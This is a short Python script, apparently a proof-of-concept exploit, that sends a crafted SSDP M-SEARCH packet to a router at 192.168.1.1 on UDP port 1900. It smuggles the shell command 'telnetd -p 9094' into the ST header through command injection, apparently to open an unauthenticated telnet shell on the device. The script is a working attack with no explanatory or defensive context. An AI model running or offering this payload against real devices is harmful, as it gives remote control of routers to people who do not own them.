import socket

buf = b'M-SEARCH * HTTP/1.1\r\nHOST: 192.168.1.1:1900\r\nST: urn:schemas-upnp-org:service:WANIPConnection:1;telnetd -p 9094;ls\r\nMX: 2\r\nMAN: "ssdp:discover"\r\n\r\n'

print("[+] sending buffer size", len(buf))
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(buf, ("192.168.1.1", 1900))
s.close()
